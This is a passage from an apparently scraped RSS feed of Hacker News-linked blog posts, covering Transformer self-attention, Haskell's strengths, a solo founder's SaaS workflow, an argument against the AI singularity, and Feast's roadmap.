<p>Say the following sentence is an input sentence we want to translate:</p>

<p>‚Äù<code>The animal didn't cross the street because it was too tired</code>‚Äù</p>

<p>What does ‚Äúit‚Äù in this sentence refer to? Is it referring to the street or to the animal? It‚Äôs a simple question to a human, but not as simple to an algorithm.</p>

<p>When the model is processing the word ‚Äúit‚Äù, self-attention allows it to associate ‚Äúit‚Äù with ‚Äúanimal‚Äù.</p>

<p>As the model processes each word (each position in the input sequence), self attention allows it to look at other positions in the input sequence for clues that can help lead to a better encoding for this word.</p>

<p>If you‚Äôre familiar with RNNs, think of how maintaining a hidden state allows an RNN to incorporate its representation of previous words/vectors it has processed with the current one it‚Äôs processing. Self-attention is the method the Transformer uses to bake the ‚Äúunderstanding‚Äù of other relevant words into the one we‚Äôre currently processing.</p>

<p><img src="https://jalammar.github.io/images/t/transformer_self-attention_visualization.png">
  <br>
  As we are encoding the word "it" in encoder #5 (the top encoder in the stack), part of the attention mechanism was focusing on "The Animal", and baked a part of its representation into the encoding of "it".
</p>

<p>Be sure to check out the <a href="https://colab.research.google.com/github/tensorflow/tensor2tensor/blob/master/tensor2tensor/notebooks/hello_t2t.ipynb">Tensor2Tensor notebook</a> where you can load a Transformer model, and examine it using this interactive visualization.</p>

<h2 id="self-attention-in-detail">Self-Attention in Detail</h2>
<p>Let‚Äôs first look at how to calculate self-attention using vectors, then proceed to look at how it‚Äôs actually implemented ‚Äì using matrices.</p>

<p>The <strong>first step</strong> in calculating self-attention is to create three vectors from each of the encoder‚Äôs input vectors (in this case, the embedding of each word). So for each word, we create a Query vector, a Key vector, and a Value vector. These vectors are created by multiplying the embedding by three matrices that we trained during the training process.</p>

<p>Notice that these new vectors are smaller in dimension than the embedding vector. Their dimensionality is 64, while the embedding and encoder input/output vectors have dimensionality of 512. They don‚Äôt HAVE to be smaller, this is an architecture choice to make the computation of multiheaded attention (mostly) constant.</p>



<p><img src="https://jalammar.github.io/images/t/transformer_self_attention_vectors.png">
  <br>
  Multiplying <span>x1</span> by the <span>WQ</span> weight matrix produces <span>q1</span>, the "query" vector associated with that word. We end up creating a "query", a "key", and a "value" projection of each word in the input sentence.
</p>



<div><p>What are the ‚Äúquery‚Äù, ‚Äúkey‚Äù, and ‚Äúvalue‚Äù vectors?
</p><p>

They‚Äôre abstractions that are useful for calculating and thinking about attention. Once you proceed with reading how attention is calculated below, you‚Äôll know pretty much all you need to know about the role each of these vectors plays.</p></div>

<p>The <strong>second step</strong> in calculating self-attention is to calculate a score. Say we‚Äôre calculating the self-attention for the first word in this example, ‚ÄúThinking‚Äù. We need to score each word of the input sentence against this word. The score determines how much focus to place on other parts of the input sentence as we encode a word at a certain position.</p>

<p>The score is calculated by taking the dot product of the <span>query vector</span> with the <span>key vector</span> of the respective word we‚Äôre scoring. So if we‚Äôre processing the self-attention for the word in position <span>#1</span>, the first score would be the dot product of <span>q1</span> and <span>k1</span>. The second score would be the dot product of <span>q1</span> and <span>k2</span>.</p>



<p><img src="https://jalammar.github.io/images/t/transformer_self_attention_score.png">
  <br>

</p>



<p>The <strong>third and forth steps</strong> are to divide the scores by 8 (the square root of the dimension of the key vectors used in the paper ‚Äì 64. This leads to having more stable gradients. There could be other possible values here, but this is the default), then pass the result through a softmax operation. Softmax normalizes the scores so they‚Äôre all positive and add up to 1.</p>



<p><img src="https://jalammar.github.io/images/t/self-attention_softmax.png">
  <br>

</p>

<p>This softmax score determines how much each word will be expressed at this position. Clearly the word at this position will have the highest softmax score, but sometimes it‚Äôs useful to attend to another word that is relevant to the current word.</p>



<p>The <strong>fifth step</strong> is to multiply each value vector by the softmax score (in preparation to sum them up). The intuition here is to keep intact the values of the word(s) we want to focus on, and drown-out irrelevant words (by multiplying them by tiny numbers like 0.001, for example).</p>

<p>The <strong>sixth step</strong> is to sum up the weighted value vectors. This produces the output of the self-attention layer at this position (for the first word).</p>



<p><img src="https://jalammar.github.io/images/t/self-attention-output.png">
  <br>
</p>

<p>That concludes the self-attention calculation. The resulting vector is one we can send along to the feed-forward neural network. In the actual implementation, however, this calculation is done in matrix form for faster processing. So let‚Äôs look at that now that we‚Äôve seen the intuition of the calculation on the word level.</p>

<h2 id="matrix-calculation-of-self-attention">Matrix Calculation of Self-Attention</h2>
<p><strong>The first step</strong> is to calculate the Query, Key, and Value matrices. We do that by packing our embeddings into a matrix <span>X</span>, and multiplying it by the weight matrices we‚Äôve trained (<span>WQ</span>, <span>WK</span>, <span>WV</span>‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jalammar.github.io/illustrated-transformer/">https://jalammar.github.io/illustrated-transformer/</a></em></p>]]>
            </description>
            <link>https://jalammar.github.io/illustrated-transformer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931724</guid>
            <pubDate>Thu, 29 Oct 2020 15:45:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931721">thread link</a>) | @_query
<br/>
October 29, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There‚Äôs been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it‚Äôs ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That‚Äôs how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It‚Äôs really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it‚Äôs highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it‚Äôs finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there‚Äôs now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it‚Äôs finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931721</guid>
            <pubDate>Thu, 29 Oct 2020 15:44:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizations as a Company of One]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24931633">thread link</a>) | @jnfr
<br/>
October 29, 2020 | https://lunchbag.ca/company-of-one/ | <a href="https://web.archive.org/web/*/https://lunchbag.ca/company-of-one/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<p><span>
				Written on <time datetime="2020-05-18 16:00:00 +0000 UTC">May 18, 2020</time>
			</span>
		</p>
		

<p>Hello! üëã My name is Jen and I‚Äôm the founder, engineer, designer and customer support at <a href="https://lunchmoney.app/">Lunch Money</a>, a personal finance and budgeting web app.</p>

<p>In short, I am a company of one. I answer the customer support emails and I code and deploy new features. I also manage the <a href="https://developers.lunchmoney.app/" target="_blank">API docs</a> and <a href="https://support.lunchmoney.app/" target="_blank">knowledge base</a>, poke around the logs when there are issues, write the <a href="https://lunchmoney.app/sample_newsletter" target="_blank">bi-monthly newsletters</a> and I designed the logo!</p>

<p>As the company scales, so too must all aspects of my work which I break down into 4 parts: customer support, engineering, product and marketing.</p>

<p><strong>Finding opportunities for process optimization is honestly one of the more fun parts of running a business</strong>. I greatly attribute these to how I‚Äôve been able to stay both solo &amp; sane up until now, currently with 600+ users and $45,000 ARR. In this post, I‚Äôm excited to share some of my most successful strategies along with anecdotes from my experience working on Lunch Money.</p>



<p>In the last 14 days, here‚Äôs what I got done across all departments:</p>

<ul>
<li><strong>Product:</strong> Launched an internal beta testers program and two sets of new features to test</li>
<li><strong>Engineering:</strong> Wrapped up a 2-week long refactor of some core components on the client-side</li>
<li><strong>Engineering:</strong> Launched a major feature: advanced transaction filters</li>
<li><strong>Engineering:</strong> Closed 13 tickets related to feature improvements and bug fixes</li>
<li><strong>Marketing:</strong> Sent out a newsletter outlining the latest new features</li>
<li><strong>Marketing:</strong> This blog post</li>
<li><strong>Marketing:</strong> Added new pages to the marketing site (<a href="https://lunchmoney.app/features/rules">Rules</a> and <a href="https://lunchmoney.app/features/collaboration">Collaboration</a>) and updated the icons in <a href="https://lunchmoney.app/features">Features</a></li>
<li><strong>Support:</strong> Received 239 inbound support tickets and sent out 358 emails</li>
</ul>

<p>What makes all this work bearable for me is the fact that there is so much variety (which, of course, is the spice of life!). I love being able to switch between tasks to keep the job interesting and my mind refreshed while still being productive overall.</p>

<p><em>Case in point: I just finished a major refactor and pushed out 2 major features to beta, so writing this blog post right now feels like a vacation for my brain.</em></p>

<p>To state the obvious, I enjoy being hyper-efficient (without burning myself out, of course). Even though I am a single person, I can still automate, optimize and parallelize processes.</p>



<h2 id="implement-safeguards">Implement safeguards</h2>

<p><i>Ah, the blissful beginnings of Lunch Money when I‚Äôd push code directly to production several times a day.</i></p>

<p>At 500+ users now, those days are long gone and I‚Äôve since needed to adopt the more boring but responsible approach of implementing safeguards to prevent shipping faulty code.</p>

<p>For one, <b>I‚Äôve been thoroughly reviewing my own code before every change</b>. Every major feature, improvement and bug fix lives in a feature branch that I still, by habit from the corporate days, prepend with <code>jen/</code>. After verifying everything works great locally, I make sure to take a break first, whether that‚Äôs working on a completely unrelated task, going for a meal or going to bed. The point of this is to ensure that I‚Äôm code reviewing with a clear head.</p>

<p>While adhering to these standards of code reviewing myself may add extra time to my overall process, it potentially saves hours of bug-fixing, answering related support tickets and self-loathing (I‚Äôm half-kidding here) down the line if I accidentally ship bad code.</p>

<center><blockquote><p lang="en" dir="ltr">New phase of Lunch Money‚Äì no more pushing major features straight to production ü§ØüòÇ <a href="https://t.co/RYsz7BnU3L">https://t.co/RYsz7BnU3L</a></p>‚Äî Jen (@lunchbag) <a href="https://twitter.com/lunchbag/status/1256987437600927744?ref_src=twsrc%5Etfw">May 3, 2020</a></blockquote> </center>

<p><b>I also recently implemented an internal beta-testing program open to Lunch Money subscribers.</b> With more users accessing my app on a regular basis, the stakes are higher to ship a version that‚Äôs as bug-free as possible.</p>

<p>As an engineering team of one, it‚Äôs nearly impossible to always get it right the first time, despite having tests (what if I missed an edge case?) or testing locally extensively (how I think my users will use a feature is not always so).</p>

<p>The beta-testing program has provided some additional benefits. It‚Äôs nice to have a cohort of users with whom I can have a more candid conversation about Lunch Money and it‚Äôs also a great way to show users that their feedback is valued!</p>

<h2 id="automate-later-than-you-need-to">Automate later than you need to</h2>

<p>While automating tasks can save a lot of time in the long-term, it doesn‚Äôt always make sense to automate right off the bat.</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png"><span>Obligatory XKCD comic (<a href="https://xkcd.com/1205/" target="_blank">link</a>)</span></p>

<p>Automating too late is not a bad thing. I‚Äôll have done the manual work enough times to understand how to eventually automate the task and what edge cases to look out for. I equate it to doing a job yourself before hiring someone‚Äì it‚Äôs always better to grok the requirements first to some degree so you can understand how to best utilize who you‚Äôve brought on (and appreciate them more!).</p>

<p>I manually triggered the emails for bi-monthly account summaries for months because I wasn‚Äôt confident the sending cadence was reasonable. After observing open rates and collecting user feedback, these are now automated to go out on the 5th &amp; 25th of every month.</p>

<p>Something that I‚Äôm glad I didn‚Äôt spend the time to automate at all was the referral program. If an existing user refers a new user and the new user subscribes to a plan, then both users will receive credit for 1 month.</p>

<p>In the end, the referral program only brought on 11 extra users. It was not a pain at all to manually process rewards for those who did. If I had spent time conjuring up all the edge cases and automating this process, it would not have been worth the time investment.</p>

<h2 id="keep-low-hanging-fruits-in-the-back-pocket">Keep low-hanging fruits in the back pocket</h2>

<p>In my task management system, I use a tag (üçè) to denote which tasks are low-hanging fruits. For the uninitiated, low-hanging fruits are quick tasks that are easy to knock out, such as one-liners or 5-minute fixes.</p>

<p><img src="https://media.giphy.com/media/YP1Jb0JNc7kqFDbdjm/giphy.gif"></p>

<p>I find that keeping these around and tackling them on days when you feel generally unmotivated can really help raise spirits. Still being able to get something completed and shipped is a great way to get out of a slump.</p>



<h2 id="timing-marketing-pushes">Timing marketing pushes</h2>

<p>At Lunch Money, a big part of the business is using the services of Plaid for bank syncing. Plaid charges on a monthly basis which means that if a user signs up on April 30, connects a bank account immediately and doesn‚Äôt end up subscribing at the end of their 14-day trial, they will charge me for this user in both April &amp; May‚Äôs invoices.</p>

<p>This realization coupled with my intense aversion to paying more than I need to has shaped a lot of practices at Lunch Money.</p>

<p>For one, the data retention policy used to be 30 days which means if your trial ends and you didn‚Äôt put in your billing information, your data will be deleted in 30 days. This certainly guarantees that I‚Äôll be overpaying for churned users and is the reason why the data retention policy has since been revised to 5 days.</p>

<p>In total, a user who does not end up subscribing can spend up to 26 days in the Lunch Money system. This comprises of a 14-day trial, the potential for a 1 week trial extension and a 5 day grace period. Assuming enough users connect their bank accounts, the best way to minimize my costs for churned users is to ensure their lifetimes are within one calendar month.</p>

<p><img src="https://lunchbag.ca/uploads/calendar-1.png"></p>

<p>As a result, I always schedule marketing pushes such as blog posts and product launches in the first few days of the month. When I came to this realization, my next Plaid bill went down for the first time.</p>

<h2 id="merging-marketing-and-engineering-for-a-combo-win">Merging marketing and engineering for a combo win</h2>

<p>Taking this a step further, the perk of having a spike in new users is that their trial periods more-or-less overlap. Usually when a new user signs up, they will poke around the product and maybe send in a bug report, a feature request or another piece of feedback. If I reply and address their feedback by putting in a fix or shipping their requested feature within days, more often than not, they end up converting into a happy customer.</p>

<p>I‚Äôve therefore identified the following cycle to maximize potential conversions from spikes in user signups:</p>

<p><img src="https://lunchbag.ca/uploads/gantt-2.png"></p>

<p>After a marketing push, let‚Äôs say a product launch, I will see an immediate increase in signups lasting about 3 days and then slowly trailing off.</p>

<p>Over the next few days, I‚Äôll start hearing from these new users via support tickets. I prioritize responding to them and I get to work. Showing these users that I‚Äôm committed to improving Lunch Money based on their feedback is a great and honest sales tactic.</p>

<p>About 3 days before the initial wave of user trials ends, I wrap up my engineering sprint and send out a newsletter detailing the latest features and improvements. This re-enforces to new users that the product is under continuous development.</p>

<p>Finally, I have a drip campaign that automatically notifies users a few days before their trial expires and on the actual date of expiry. This period of time is when I typically see most users convert ü§û.</p>



<p>I used to think that if I were to hire someone, it would first be a customer support agent but I‚Äôve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I‚Äôm also able to identify and overhaul the common sources of trouble for users.</p>

<p>I‚Äôve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<p><img src="https://lunchbag.ca/uploads/screen-shot-2020-05-21-at-4-20-15-pm.png"><span>Handling support on my own should be sustainable at least for the foreseeable future!</span></p>

<h2 id="how-do-support-tickets-work-at-lunch-money">How do support tickets work at Lunch Money?</h2>

<p>A feedback button is located at the bottom right corner of every page. Clicking on it opens up a text area wherein users can submit feature requests, questions, bug ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lunchbag.ca/company-of-one/">https://lunchbag.ca/company-of-one/</a></em></p>]]>
            </description>
            <link>https://lunchbag.ca/company-of-one/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931633</guid>
            <pubDate>Thu, 29 Oct 2020 15:36:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Case Against the Singularity]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24931612">thread link</a>) | @joubert
<br/>
October 29, 2020 | http://www.furidamu.org/blog/2020/05/03/the-case-against-the-singularity/ | <a href="https://web.archive.org/web/*/http://www.furidamu.org/blog/2020/05/03/the-case-against-the-singularity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article_text">
    <p>From Musk's <a href="https://twitter.com/elonmusk/status/495759307346952192">"Potentially more dangerous than nukes." tweet</a>, increased funding for the Machine Intelligence Research Institute (MIRI) to the founding of cross-industry groups like the <a href="https://www.partnershiponai.org/">Partnership on AI</a>, AI is being taken more seriously.</p>
<p>One worry that is sometimes cited, as in the book <a href="https://en.wikipedia.org/wiki/Superintelligence:_Paths,_Dangers,_Strategies">Superintelligence</a><sup><a href="http://www.furidamu.org/cache/blog_2020_05_03_the-case-against-the-singularity/en.wikipedia.org_wiki_Superintelligence/en.wikipedia.org/wiki/superintelligence:_paths,_dangers,_strategies/index.html">cache</a></sup> by Nick Bostrom, is that once we reach human-level AI, it might rapidly improve itself past anything humans can envision, becoming impossible to control. This is called "Singularity", because anything after such a point is unforseeable.</p>
<p>The argument for a Singularity rests on the fact that a hypothetical AI could devote all its resources to improving itself, use its new found abilities to improve itself even faster, and thus increase its capabilities exponentially:</p>
<p><img alt="linear return on investment" src="http://www.furidamu.org/images/2020-05-02-singularity-linear.png"></p>
<p>But how likely is such a scenario?</p>
<p>With nearly 8 years since AlexNet and more than 5 since DQN, we can examine the track record of deep learning to give us some intuition.</p>
<p>In deep reinforcement learning, Atari has long been the domain of choice for many researchers, attracting fierce competition to obtain the best score. (Reinforcement learning concerns itself with how agents should interact with their environment to maximise some measure of reward.)</p>
<p>If we plot the scores obtained in various top papers against the number of environment interactions of the agent - a rough measure of training effort - we obtain the following plot:</p>
<p><img alt="Atari score vs environment fames" src="http://www.furidamu.org/images/2020-05-02-singularity-atari.png"></p>
<p>More effort does indeed lead to better performance, but note that the x-axis is logarithmic! To obtain constant improvements in score, an agent needs to expend exponentially more effort.</p>
<p>Similar relationships hold in other domains. Let's take one I'm most familiar with, the playing strength of AlphaGo Zero, measured in Elo, over the course of 40 days of training (as reported in the AlphaGo Zero paper):</p>
<p><img alt="AlphaGo Zero elo vs training time" src="http://www.furidamu.org/images/2020-05-02-singularity-elo.png"></p>
<p>Again, increased training leads to better performance, and again note the logarithmic x-axis - except in this case, the return on training effort seems even worse.</p>
<p>Using what we learned from these domains - $\text{capability} = log(\text{effort})$ - and applying it to our original AI self-improvement graph, we end up with:</p>
<p><img alt="logarithmic return on investment" src="http://www.furidamu.org/images/2020-05-02-singularity-log.png"></p>
<p>Far from an explosion of ability, improvement seems to peter out and become slower and slower.</p>
<p>In fact, this phenomenon is not constrained to machine learning or AI - similar results seem to hold for other fields of research. In <a href="https://web.stanford.edu/~chadj/IdeaPF.pdf">Are Ideas Getting Harder to Find?</a><sup><a href="http://www.furidamu.org/cache/blog_2020_05_03_the-case-against-the-singularity/web.stanford.edu_~chadj_IdeaPF.pdf/web.stanford.edu/~chadj/ideapf.pdf">cache</a></sup> Bloom et al provide convincing evidence that while the number of researchers has been growing for decades, research productivity and output has actually been declining! </p>
<p><img alt="number of researchers and researcher productivity over time" src="http://www.furidamu.org/images/2020-05-02-singularity-productivity.png"></p>
<p>Figure 2 from <a href="https://web.stanford.edu/~chadj/IdeaPF.pdf">Are Ideas Getting Harder to Find?</a>, consistent with decreasing return on effort.</p>
<p>Not only is there no free lunch, lunch gets more expensive every day.</p>

  </div></div>]]>
            </description>
            <link>http://www.furidamu.org/blog/2020/05/03/the-case-against-the-singularity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931612</guid>
            <pubDate>Thu, 29 Oct 2020 15:34:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A State of Feast]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931596">thread link</a>) | @willempienaar
<br/>
October 29, 2020 | https://blog.feast.dev/post/a-state-of-feast | <a href="https://web.archive.org/web/*/https://blog.feast.dev/post/a-state-of-feast">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><h3>Introduction</h3><p>Two years ago we first announced the launch of Feast, an open source feature store for machine learning. Feast is an operational data system that solves some of the key challenges that ML teams encounter while productionizing machine learning systems.<br>‚Äç<br>Recognizing that ML and Feast have advanced since we launched, we take a moment today to discuss the past, present and future of Feast. We consider the more significant lessons we learned while building Feast, where we see the project heading, and why teams should consider adopting Feast as part of their operational ML stacks.</p><h3>Background</h3><p>Feast was developed to address the challenges faced while productionizing data for machine learning. In our original <a href="https://cloud.google.com/blog/products/ai-machine-learning/introducing-feast-an-open-source-feature-store-for-machine-learning">Google Cloud article</a>, we highlighted some of these challenges, namely:</p><ol role="list"><li>Features aren‚Äôt reused.</li><li>Feature definitions are inconsistent across teams.</li><li>Getting features into production is hard.</li><li>Feature values are inconsistent between training and serving.</li></ol><p>Whereas an industry to solve data transformations and data-quality problems already existed, our focus for shaping Feast was to overcome operational ML hurdles that exist between data science and ML engineering. Toward that end, our initial aim was to provide:</p><ol role="list"><li><strong>Registry</strong>: The registry is a common catalog with which to explore, develop, collaborate on, and publish new feature definitions within and across teams. It is the central interface for all interactions with the feature store.&nbsp;</li><li><strong>Ingestion: </strong>A means for continually ingesting batch and streaming data and storing consistent copies in both an offline and online store. This layer automates most data-management work and ensures that features are always available for serving.</li><li><strong>Serving: </strong>A feature-retrieval interface which provides a temporally consistent view of features for both training and online serving. Serving improves iteration speed by minimizing coupling to data infrastructure, and prevents training-serving skew through consistent data access.</li><li><strong>Monitoring: </strong>Tools that allow operational teams to monitor and act on the quality and accuracy of data consumed by models. This is achieved through the generation of statistics, metrics, logs, alerts, and data validation.<br></li></ol><p>Guided by this design, we co-developed and shipped Feast with our friends over at Google. We then open sourced the project in early 2019, and have since been running Feast in production and at scale. In our follow up blog post, <a href="https://blog.gojekengineering.com/feast-bridging-ml-models-and-data-efd06b7d1644">Bridging ML Models and Data</a>, we touched on the impact Feast has had at companies like Gojek.</p><h3>Feast today</h3><p>Teams, large and small, are increasingly searching for ways to simplify the productionization and maintenance of their ML systems at scale. Since open sourcing Feast, we‚Äôve seen both the demand for these tools and the activity around this project soar. Working alongside our open source community, we‚Äôve released key pieces of our stack throughout the last year, and steadily expanded Feast into a robust feature store. Highlights include:</p><ul role="list"><li>Point-in-time correct queries that prevent feature data leakage.</li><li>A query optimized table-based data model in the form of feature sets.</li><li>Storage connectors with implementations for Cassandra and Redis Cluster.</li><li>Statistics generation and data validation through TFDV integration.</li><li>Authentication and authorization support for SDKs and APIs.</li><li>Diagnostic tooling through request/response logging, audit logs, and Statsd integration.<br></li></ul><figure id="w-node-85ee3bb9c25b-dcb020c5"><a href="https://uploads-ssl.webflow.com/5f96e7a5ea43eef2c8a67238/5f972549f25eb027d6ece6ef_zVSoBgsmId8I089VKWFm1LQc9FFOsOdNBxvDIiAqD2282Fs9ruoOsngQ9P4RFvQnd5myA9jBxKM0Yz5r6jQEPAzCNChIlXdAH9Kf6s5yYTfQAKgX5JgMvS-9T_Z1swcaQTA0JoD5.png" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5f96e7a5ea43eef2c8a67238/5f972549f25eb027d6ece6ef_zVSoBgsmId8I089VKWFm1LQc9FFOsOdNBxvDIiAqD2282Fs9ruoOsngQ9P4RFvQnd5myA9jBxKM0Yz5r6jQEPAzCNChIlXdAH9Kf6s5yYTfQAKgX5JgMvS-9T_Z1swcaQTA0JoD5.png" alt=""></p></a></figure><p>Feast has grown more rapidly than initially anticipated, with multiple large companies, including&nbsp;Agoda, Gojek, Farfetch, Postmates, and Zulily adopting and/or contributing to the project. We‚Äôve also been working closely with other open source teams, and we are excited to share that Feast is now a <a href="https://www.kubeflow.org/docs/components/feature-store/">component in Kubeflow</a>. Over the coming months we will be enhancing this integration, making it easier for users to deploy Feast and Kubeflow together.</p><h3>Lessons learned</h3><p>Through frequent engagement with our community and by way of running Feast in production ourselves, we‚Äôve learned critical lessons:<br></p><p><strong>Feast requires too much infrastructure:</strong> Requiring users provision a large system is a big ask. A minimal Feast deployment requires Kafka, Zookeeper, Postgres, Redis, and multiple Feast services.&nbsp;</p><p>‚Äç<strong>Feast lacks composability: </strong>Requiring all infrastructural components be present in order to have a functional system removes all modularity.</p><p><strong>Ingestion is too complex: </strong>Incorporating a Kafka-based stream-first ingestion layer trivializes data consistency across stores, but the complete ingestion flow from source to sink can still mysteriously fail at multiple points.<br></p><p><strong>Our technology choices hinder generalization: </strong>Leveraging technologies like BigQuery, Apache Beam on Dataflow, and Apache Kafka has allowed us to move faster in delivering functionality. However, these technologies now impede our ability to generalize to other clouds or deployment environments.<br></p><h3>The future of Feast</h3><blockquote><em>‚ÄúAlways in motion is the future.‚Äù <br></em>- Yoda, The Empire Strikes Back</blockquote><p>While feature stores have already become essential systems at large technology companies, we believe their widespread adoption will begin in 2021. We also foresee the release of multiple managed feature stores over the next year, as vendors seek to enter the burgeoning operational ML market.<br></p><p>As we‚Äôve discussed, feature stores serve both offline and production ML needs, and therefore are primarily built by engineers for engineers. What we need, however, is a feature store that's purpose-built for data-science workflows. Feast will move away from an infrastructure-centric approach toward a more localized experience that does just this: builds on teams‚Äô existing data-science workflows.&nbsp;<br></p><p>The lessons we‚Äôve learned during the preceding two years have crystallized a vision for what Feast should become: <strong>a light-weight modular feature store</strong>. One that‚Äôs easy to pick up, adds value to teams large and small, and can be progressively applied to production use cases that span multiple teams, projects, and cloud-environments. We aim to reach this by applying the following design principles:<br></p><p><strong>1. Python-first: </strong>First-class support for running a minimal version of Feast entirely from a notebook, with all infrastructural dependencies becoming optional enhancements.&nbsp;</p><ul role="list"><li>Encourages quick evaluation of the software and ensures Feast is user friendly&nbsp;</li><li>Minimizes the operational burden of running the system in production</li><li>Simplifies testing, developing, and maintaining Feast</li></ul><p><strong>2. Production-ready:</strong> A collection of battle-tested components built for production.&nbsp;</p><ul start="" role="list"><li>Manages high-scale operational workloads for both training and serving</li><li>Integrates with industry-standard monitoring systems for both data and services</li><li>Provides a simplified architecture that facilitates diagnostics and debugging</li></ul><p><strong>3. Composability:</strong> Modular components with clear extension, integration, and upgrade points that allow for high composability.</p><ul start="" role="list"><li>Grants teams the flexibility to adopt specific Feast components&nbsp;</li><li>Incentivizes defining clear component boundaries and data contracts</li><li>Eliminates barriers on teams intending to swap in their existing technologies</li></ul><p><strong>4. Cloud-agnostic:</strong> Removal of all hard coupling to cloud-specific services, and inclusion of portable technologies like Apache Spark for data processing and Parquet for offline storage.</p><ul start="" role="list"><li>Enables deployment into all cloud and on-premise environments</li><li>Introduces a rich set of storage and integration options through Spark I/O</li><li>Improves development velocity by allowing all infrastructure to run locally<br></li></ul><figure id="w-node-b5b591ffcad9-dcb020c5"><a 